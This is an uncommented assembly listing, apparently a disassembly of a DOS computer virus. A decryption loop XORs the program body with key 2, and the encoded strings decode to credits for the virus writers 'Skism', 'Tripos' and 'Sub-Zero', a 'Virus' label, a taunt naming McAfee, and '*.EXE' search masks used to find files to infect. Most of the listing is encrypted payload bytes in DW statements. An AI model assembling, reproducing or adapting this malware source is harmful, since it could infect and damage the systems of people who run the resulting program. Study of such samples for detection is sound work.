﻿

	PAGE	,132
S00000	SEGMENT BYTE PUBLIC 'code'
	ASSUME	CS:S00000
	ASSUME	SS:S00000
	ASSUME	DS:S00000
H00000	DB	256 DUP(?)
P00100	PROC	FAR
	ASSUME	ES:S00000
H00100:
	JMP	SHORT H00104
	DB	90H
H00103	DB	2
H00104:
	CALL	P0010A
	JMP	H006F1
P0010A	PROC	NEAR
H0010A:
	PUSH	CX
	MOV	BX,0138H
H0010E:
	MOV	CH,[BX]
	XOR	CH,H00103
	MOV	[BX],CH
	INC	BX
	CMP	BX,0900H
	JLE	H0010E
	POP	CX
	RET
P0010A	ENDP
	DW	00BAH
	DW	8B01H
	DW	0E51EH
	DW	5306H
	DW	0E0E8H
	DW	5BFFH
	DW	0C8B9H
	DW	0B407H
	DW	0CD40H
	DW	5321H
	DW	0D4E8H
	DW	5BFFH
	DW	0DC3H
	DW	1B10H
	DW	0800H
	DW	1BB1H
	DW	0C104H
	DW	2218H
	DW	0BDC6H
	DW	011BH
	DW	1BB1H
	DW	0B115H
	DW	011BH
	DW	1B1AH
	DW	0C100H
	DW	0418H
	DW	0DBC6H
	DW	0B302H
	DW	14B3H
	DW	1918H
	DW	10B3H
	DW	22DFH
	DW	0822H
	DW	1BB1H
	DW	0C101H
	DW	0C18H
	DW	0C0C6H
	DW	0518H
	DW	0C3C6H
	DW	0BDC6H
	DW	2222H
	DW	1B1AH
	DW	0B100H
	DW	061BH
	DW	0B302H
	DW	14B3H
	DW	1D18H
	DW	10B3H
	DW	22DFH
	DW	0C208H
	DW	0C6C6H
	DW	0C6C0H
	DW	1BDBH
	DW	0B10CH
	DW	0B1BH
	DW	22B1H
	DW	1A22H
	DW	001BH
	DW	1BB1H
	DW	0201H
	DW	0B3B3H
	DW	1814H
	DW	0B323H
	DW	0DF10H
	DW	001BH
	DW	0B108H
	DW	121BH
	DW	1BB1H
	DW	0C20BH
	DW	0C6C6H
	DW	1B1AH
	DW	0B100H
	DW	001BH
	DW	0B302H
	DW	14B3H
	DW	2118H
	DW	10B3H
	DW	22DFH
	DW	1B13H
	DW	0B06H
	DW	10DCH
	DW	1322H
	DW	0DC22H
	DW	2210H
	DW	2213H
	DW	10DCH
	DW	1322H
	DW	0DC22H
	DW	2210H
	DW	1B13H
	DW	0DC06H
	DW	2210H
	DW	2213H
	DW	0DC22H
	DW	2210H
	DW	1322H
	DW	2222H
	DW	10DCH
	DW	2222H
	DW	1B1AH
	DW	0800H
	DW	22B1H
	DW	0222H
	DW	0B3B3H
	DW	1814H
	DW	0B30AH
	DW	180DH
	DW	0B31AH
	DW	1002H
	DW	14DFH
	DW	0B3B3H
	DW	10B3H
	DW	13DFH
	DW	0B22H
	DW	02DCH
	DW	1810H
	DW	0B306H
	DW	2213H
	DW	0DC0BH
	DW	0DC22H
	DW	1002H
	DW	0B3B3H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	1810H
	DW	0B306H
	DW	2213H
	DW	0DC0BH
	DW	0DC22H
	DW	0DC22H
	DW	0DC22H
	DW	1002H
	DW	22B3H
	DW	1B1AH
	DW	0800H
	DW	22B1H
	DW	0222H
	DW	0B3B3H
	DW	1814H
	DW	0B305H
	DW	180DH
	DW	0B31BH
	DW	1002H
	DW	22DFH
	DW	1422H
	DW	10B3H
	DW	13DFH
	DW	061BH
	DW	0DC0BH
	DW	2210H
	DW	2213H
	DW	0DC22H
	DW	1002H
	DW	22B3H
	DW	1322H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	1B13H
	DW	0B06H
	DW	10DCH
	DW	1322H
	DW	0DC22H
	DW	1002H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	22B3H
	DW	081AH
	DW	0C6C6H
	DW	0DBC0H
	DW	2222H
	DW	0B302H
	DW	14B3H
	DW	0518H
	DW	0DB3H
	DW	0E18H
	DW	12B3H
	DW	051BH
	DW	1814H
	DW	0B301H
	DW	1002H
	DW	1BDFH
	DW	0800H
	DW	22B1H
	DW	0222H
	DW	0B3B3H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	2213H
	DW	0DC0BH
	DW	0DC22H
	DW	1002H
	DW	22B3H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	22B3H
	DW	0B3B3H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	22B3H
	DW	0B3B3H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	22B3H
	DW	221AH
	DW	0822H
	DW	1BB1H
	DW	0200H
	DW	0B3B3H
	DW	1814H
	DW	0B305H
	DW	180DH
	DW	0B30EH
	DW	0DC12H
	DW	0D9D9H
	DW	1402H
	DW	0B3B3H
	DW	0B0B0H
	DW	120DH
	DW	14D9H
	DW	0B3B3H
	DW	02B3H
	DW	0DF10H
	DW	011BH
	DW	0B108H
	DW	1322H
	DW	061BH
	DW	0DC0BH
	DW	1002H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	13B3H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	1B13H
	DW	0B06H
	DW	02DCH
	DW	0B310H
	DW	2213H
	DW	0DC0BH
	DW	1002H
	DW	1BB3H
	DW	1300H
	DW	0B22H
	DW	02DCH
	DW	0B310H
	DW	1A22H
	DW	2222H
	DW	0B108H
	DW	001BH
	DW	0B302H
	DW	14B3H
	DW	0518H
	DW	0DB3H
	DW	0E18H
	DW	12B3H
	DW	0D9DCH
	DW	02D9H
	DW	0B314H
	DW	0B3B3H
	DW	0DB0H
	DW	0D912H
	DW	0B314H
	DW	02B3H
	DW	0DF10H
	DW	061BH
	DW	0B108H
	DW	2222H
	DW	1802H
	DW	0B307H
	DW	0B322H
	DW	22B3H
	DW	0B3B3H
	DW	0B322H
	DW	22B3H
	DW	0718H
	DW	22B3H
	DW	0B3B3H
	DW	001BH
	DW	0B3B3H
	DW	22B3H
	DW	221AH
	DW	0822H
	DW	1BB1H
	DW	0200H
	DW	0B3B3H
	DW	1814H
	DW	0B301H
	DW	0B30DH
	DW	0B3B3H
	DW	0B302H
	DW	180DH
	DW	0B30EH
	DW	0DC12H
	DW	0718H
	DW	14D9H
	DW	0B3B3H
	DW	1002H
	DW	1BDFH
	DW	0801H
	DW	0C6D8H
	DW	1BDBH
	DW	0D818H
	DW	0C6C6H
	DW	0BDC6H
	DW	2222H
	DW	221AH
	DW	0B122H
	DW	011BH
	DW	0B302H
	DW	14B3H
	DW	0B3B3H
	DW	0DB3H
	DW	1818H
	DW	02B3H
	DW	0DF10H
	DW	001BH
	DW	0C108H
	DW	0418H
	DW	0C0C6H
	DW	1618H
	DW	0DBC6H
	DW	001BH
	DW	22B1H
	DW	1A22H
	DW	2222H
	DW	18C1H
	DW	0C601H
	DW	02BDH
	DW	0B3B3H
	DW	140DH
	DW	1F18H
	DW	02B3H
	DW	0DF10H
	DW	2222H
	DW	0B108H
	DW	071BH
	DW	2216H
	DW	140DH
	DW	1656H
	DB	'jg"ocl"ujm"`pmwejv"{mw"'
	DW	2210H
	DW	0822H
	DW	22B1H
	DW	1A22H
	DW	2222H
	DW	1BB1H
	DW	0B101H
	DW	0B302H
	DW	0DB3H
	DW	1814H
	DW	0B31EH
	DW	1002H
	DW	1BDFH
	DW	0800H
	DW	1BB1H
	DW	0201H
	DW	0B3B3H
	DW	2216H
	DB	0DH
	DB	'400."Qikqo"Mlg."Acrvkcl"'
	DW	2210H
	DW	0822H
	DW	22B1H
	DW	1A22H
	DW	2222H
	DW	1BB1H
	DW	0B101H
	DW	0B302H
	DW	0DB3H
	DW	1814H
	DW	0B310H
	DW	1002H
	DW	0DDFH
	DW	1814H
	DW	0B305H
	DW	1002H
	DW	1BDFH
	DW	0801H
	DW	1BB1H
	DW	0201H
	DW	0B3B3H
	DW	2216H
	DB	0DH
	DB	'Vpkrq."clf"Qw`/Xgpm"lmu"'
	DW	2210H
	DW	0822H
	DW	22B1H
	DW	1A22H
	DW	2222H
	DW	1BB1H
	DW	0B101H
	DW	0B302H
	DW	0DB3H
	DW	1814H
	DW	0B310H
	DW	1002H
	DW	1BDFH
	DW	0801H
	DW	1BB1H
	DW	0B105H
	DW	011BH
	DW	0B302H
	DW	16B3H
	DW	0D22H
	DB	'qjcliq"{mw"ceckl.""ukvj"'
	DW	2210H
	DW	0822H
	DW	0C6C2H
	DW	1AC6H
	DW	2222H
	DW	1BB1H
	DW	0B101H
	DW	0B302H
	DW	0DB3H
	DW	1814H
	DW	0B310H
	DW	1002H
	DW	1BDFH
	DW	0801H
	DW	0C6C2H
	DW	0BDC6H
	DW	061BH
	DW	0C6C1H
	DW	22BDH
	DW	0222H
	DW	0B3B3H
	DW	2216H
	DB	0DH
	DB	'jkq"ncvgqv,,,'
	DW	081BH
	DW	1B10H
	DW	1A06H
	DW	2222H
	DW	0C208H
	DW	0C6C6H
	DW	0C6C0H
	DW	02C3H
	DW	0B3B3H
	DW	140DH
	DW	1118H
	DW	02B3H
	DW	0DF10H
	DW	071BH
	DW	0B108H
	DW	061BH
	DW	22B1H
	DW	22B1H
	DW	0222H
	DW	1A18H
	DW	1BB3H
	DW	1A04H
	DW	061BH
	DW	0B108H
	DW	2222H
	DW	0B302H
	DW	0DB3H
	DW	1814H
	DW	0B315H
	DW	1002H
	DW	22DFH
	DW	0822H
	DW	1BB1H
	DW	0B106H
	DW	0C222H
	DW	1E18H
	DW	0BDC6H
	DW	011BH
	DW	0C61AH
	DW	0C0C6H
	DW	0C6C6H
	DW	22DBH
	DW	0222H
	DW	0B3B3H
	DW	140DH
	DW	1418H
	DW	02B3H
	DW	0DF10H
	DW	001BH
	DW	0C108H
	DW	0C6C6H
	DW	0C0C6H
	DW	0DBC6H
	DW	071BH
	DW	2217H
	DB	0CH
	DB	'Qikqo"3;;0"/"Tkpwq'
	DW	0118H
	DW	2223H
	DW	2210H
	DW	0C108H
	DW	0118H
	DW	1AC6H
	DW	2222H
	DW	1BB1H
	DW	0206H
	DW	0B3B3H
	DW	140DH
	DW	0A18H
	DW	02B3H
	DW	0DF10H
	DW	0A1BH
	DW	0D808H
	DW	0418H
	DW	0DBC6H
	DW	001BH
	DW	1BB1H
	DW	0207H
	DW	0B3B3H
	DW	1B17H
	DW	0D01H
	DB	'Egv"c"ncvg"rcqq#'
	DW	011BH
	DW	2210H
	DW	0B108H
	DW	011BH
	DW	0D81AH
	DW	0DBC6H
	DW	001BH
	DW	0B302H
	DW	0DB3H
	DW	1811H
	DW	0D909H
	DW	0D914H
	DW	12D9H
	DW	10DFH
	DW	071BH
	DW	0B108H
	DW	081BH
	DW	1BB1H
	DW	0207H
	DW	1A18H
	DW	22B3H
	DW	0822H
	DW	1BB1H
	DW	1A01H
	DW	22B1H
	DW	0B302H
	DW	0DB3H
	DW	1811H
	DW	0D919H
	DW	1002H
	DW	1BDFH
	DW	0805H
	DW	1BB1H
	DW	0D811H
	DW	0918H
	DW	0DBC6H
	DW	011BH
	DW	021AH
	DW	0B3B3H
	DW	120DH
	DW	2218H
	DW	0DFD9H
	DW	1B10H
	DW	0806H
	DW	1BB1H
	DW	0B111H
	DW	121BH
	DW	0D1AH
	DW	1812H
	DW	0D921H
	DW	10DFH
	DW	011BH
	DW	0C208H
	DW	1118H
	DW	0DBC6H
	DW	121BH
	DW	281AH
	DB	2
	DB	'(,GZG'
	DW	5E02H
	DW	0102H
	DB	'========"""'
	DW	0111H
	DW	0202H
	DW	2802H
	DW	0EFD3H
	DW	1348H
	DW	7B68H
	DW	14D4H
	DW	0202H
	DW	0202H
	DB	'FMQ'
	DB	2
	DB	'""""'
	DW	0202H
	DW	0202H
	DW	0102H
	DB	'========GZG'
	DW	0705H
	DW	2302H
	DW	2802H
	DW	0EFD3H
	DB	'H"*'
	DW	2300H
	DW	0002H
	DW	0202H
	DB	2
	DB	'VCPEGP,GZG'
	DW	0202H
	DW	9502H
	DW	4432H
	DW	7304H
	DW	9504H
	DW	0232H
	DB	'VGOR'
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0202H
	DW	0207H
	DW	002AH
	DW	0223H
	DW	0222H
	DW	22CFH
	DW	0202H
H006F1:
	MOV	DX,3202H
	IRET
P00100	ENDP
	DW	3E23H
	DW	7001H
	DW	0B629H
	DW	0CF2EH
	DW	8A23H
	DW	0114H
	DW	0B603H
	DW	0CF28H
	DW	8223H
	DW	1BF8H
	DW	067EH
	DW	073EH
	DW	0176H
	DW	77E9H
	DW	0BC92H
	DW	033AH
	DW	02BAH
	DW	8CBAH
	DW	0BDC2H
	DW	0202H
	DW	06BBH
	DW	0EA07H
	DW	0207H
	DW	0FCE9H
	DW	88EBH
	DW	0E102H
	DW	8959H
	DW	31D5H
	DW	0FEC2H
	DB	0AEH
	DB	'>"p'
	DW	0A907H
	DW	0FAE0H
	DW	4EE9H
	DW	123EH
	DW	0571H
	DW	0E682H
	DW	08F2H
	DW	0E9E2H
	DW	3EF3H
	DW	761AH
	DW	7111H
	DW	2E1BH
	DW	0012H
	DW	00C2H
	DW	00C2H
	DW	00C2H
	DW	82C2H
	DW	8DE6H
	DW	0E208H
	DW	0D8E9H
	DW	0C083H
	DW	02A2H
	DW	0F889H
	DW	0D0E9H
	DW	193EH
	DW	0570H
	DW	0CE77H
	DW	0F682H
	DW	0E982H
	DW	3EC5H
	DW	891BH
	DW	0AEDBH
	DW	0CA88H
	DW	22B2H
	DW	0076H
	DW	49AEH
	DW	0EF30H
	DW	0F143H
	DW	89A9H
	DW	4BC9H
	DW	0A8E2H
	DW	0B8C1H
	DW	0444H
	DW	18B6H
	DW	23CFH
	DW	1BB6H
	DW	23CFH
	DW	0D288H
	DW	0C0FCH
	DW	45B6H
	DW	0A7BCH
	DW	0CF04H
	DW	0B823H
	DW	0446H
	DW	39B6H
	DW	23CFH
	DW	11BBH
	DW	0B802H
	DW	043EH
	DW	4CB6H
	DW	23CFH
	DW	103FH
	DW	7702H
	DW	0E901H
	DW	9253H
	DW	4DB6H
	DW	23CFH
	DW	103FH
	DW	7602H
	DW	0B845H
	DW	0466H
	DW	39B6H
	DW	23CFH
	DW	2DB6H
	DW	23CFH
	DW	048EH
	DW	049EH
	DW	1C8BH
	DW	049CH
	DW	73B8H
	DW	0B604H
	DW	0CF18H
	DW	0BB23H
	DW	0205H
	DW	3CB8H
	DW	0B604H
	DW	0CF4CH
	DW	3F23H
	DW	0210H
	DW	2377H
	DW	4DB6H
	DW	23CFH
	DW	103FH
	DW	7702H
	DW	0B81AH
	DW	0446H
	DW	39B6H
	DW	23CFH
	DW	18B6H
	DW	1C8CH
	DW	049EH
	DW	1489H
	DW	049CH
	DW	23CFH
	DW	0B2E9H
	DW	7BE9H
	DW	0B692H
	DW	0CF2DH
	DW	8E23H
	DW	0A004H
	DW	8B04H
	DW	0A21CH
	DW	0B804H
	DW	048DH
	DW	73B9H
	DW	8904H
	DW	1A45H
	DW	0EBA1H
	DW	8904H
	DW	1445H
	DW	0E5A1H
	DW	8904H
	DW	1745H
	DW	02BAH
	DW	0CF41H
	DW	8B23H
	DW	0E90CH
	DW	0BA04H
	DW	4103H
	DW	0CB31H
	DW	23CFH
	DW	02BAH
	DW	0CF3FH
	DB	'#p!'
	DW	0E7A1H
	DW	0B604H
	DW	893DH
	DW	0E71CH
	DW	0BB04H
	DW	0200H
	DW	0EFB8H
	DW	0CF04H
	DW	0B623H
	DW	893CH
	DW	0E71CH
	DW	0CF04H
	DW	8923H
	DW	0EF1CH
	DW	8304H
	DW	0E9F9H
	DW	7700H
	DW	0B60DH
	DW	8C18H
	DW	0A01CH
	DW	8904H
	DW	0A214H
	DW	0CF04H
	DW	0EB23H
	DW	0FD77H
	DW	8DB8H
	DW	0BA04H
	DW	3F00H
	DW	23CFH
	DW	0E7A1H
	DW	0EA04H
	DW	0FA9DH
	DW	03BAH
	DW	8955H
	DW	0E71CH
	DW	8904H
	DW	0E50CH
	DW	8904H
	DW	0EB14H
	DW	0CF04H
	DW	0BA23H
	DW	4103H
	DW	0C89H
	DW	04E9H
	DW	8DB8H
	DW	0CF04H
	DW	0B623H
	DW	0B839H
	DW	0446H
	DW	23CFH
	DW	39B6H
	DW	0A7B8H
	DW	0CF04H
	DW	0BA23H
	DW	4E02H
	DB	0CFH
	DB	'#OaCdgg"upmvg"Ujcng######'
S00000	ENDS
	END	P00100

